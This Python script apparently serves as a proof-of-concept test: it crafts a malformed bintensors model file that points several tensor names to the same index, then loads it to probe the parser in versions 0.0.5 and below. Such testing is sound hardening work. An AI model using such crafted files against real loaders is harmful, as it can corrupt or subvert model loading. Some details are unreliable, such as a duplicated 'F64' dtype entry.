# Safetensors attack proposal #4
import os
import torch 
from bintensors.torch import load_file, load, save
from typing import List, Dict
from itertools import chain


_DTYPE = {
    "BOL": 0,
    "U8": 1,
    "I8": 2,
    "F8_E5M2": 3,
    "F8_E4M3": 4,
    "I16": 5,
    "U16": 6,
    "F16": 7,
    "BF16": 8,
    "I32": 9,
    "U32": 10,
    "F32": 11,
    "F64": 12,
    "I64": 13,
    "F64": 14,
}

from typing import Tuple, List


def encode_unsigned_variant_encoding(number: int) -> bytes:
    """Encodes an unsigned integer into a variable-length format."""
    if number > 0xFFFFFFFF:
        return b"\xfd" + number.to_bytes(8, "little")
    elif number > 0xFFFF:
        return b"\xfc" + number.to_bytes(4, "little")
    elif number > 0xFA:
        return b"\xfb" + number.to_bytes(2, "little")
    else:
        return number.to_bytes(1, "little")


def encode_tensor_info(dtype: str, shape: Tuple[int, ...], offset: Tuple[int, int]) -> List[bytes]:
    """Encodes the struct TensorInfo into byte buffer"""
    if dtype not in _DTYPE:
        raise ValueError(f"Unsupported dtype: {dtype}")

    # flatten out the tensor info
    layout = chain([_DTYPE[dtype], len(shape)], shape, offset)
    return b"".join(list(map(encode_unsigned_variant_encoding, layout)))


def custom_encode_hash_map(index_map: Dict[str, int]) -> List[bytes]:
    """Encodes a dictionary of string keys and integer values."""
    length = encode_unsigned_variant_encoding(len(index_map))

    hash_map_layout = chain.from_iterable(
        (
            encode_unsigned_variant_encoding(len(k)),
            k.encode("utf-8"),
            encode_unsigned_variant_encoding(0), # payload
        )
        for k, v in index_map.items()
    )

    return b"".join(chain([length], hash_map_layout))

filename = "bintensors_abuse_attempt_5.bt"


def create_payload(size: int):
    """Generates a binary payload with tensor metadata and hash map layout."""
    shape = [(1, 1), (2, 2)]

    length = encode_unsigned_variant_encoding(size)

    # Create tensor info buffer
    tensor_info_buffer = b"".join(
        [encode_tensor_info(
            "F32",
            (1, 1),
            (0, 4),
        ),
         encode_tensor_info(
            "F32",
            (2, 2),
            (4, 20),
        )]
    )

    layout_tensor_info = length + tensor_info_buffer

    # Create index_map { "weight_0" : 0, "weight_1" : 0 } same index
    hash_map_layout = custom_encode_hash_map({f"weight_{i}": i for i in range(size)})

    # Construct full layout
    layout = b"\0" + layout_tensor_info + hash_map_layout
    layout += b" " * (((8 - len(layout)) % 8) % 8)
    n = len(layout)
    n_header = n.to_bytes(8, "little")

    # Write payload to file
    with open(filename, "wb") as f:
        f.write(n_header)
        f.write(layout)
        f.write(b"\0" * 20)

    print(f"Payload written to {filename}")
    return n_header + layout + (b"\0" * 20)


if __name__ == "__main__":
    import warnings
    import bintensors
    
    
    if bintensors.__version__ <= "0.0.5":
        warnings.warn("This attack will be depricated within the release version of bintensors, and only applies 0.0.5 and below.")
        create_payload(2)
        print(f"The file {filename} is {os.path.getsize(filename) / 10_000_00} Mb")
        buffer = load_file(filename)
        print(buffer)

        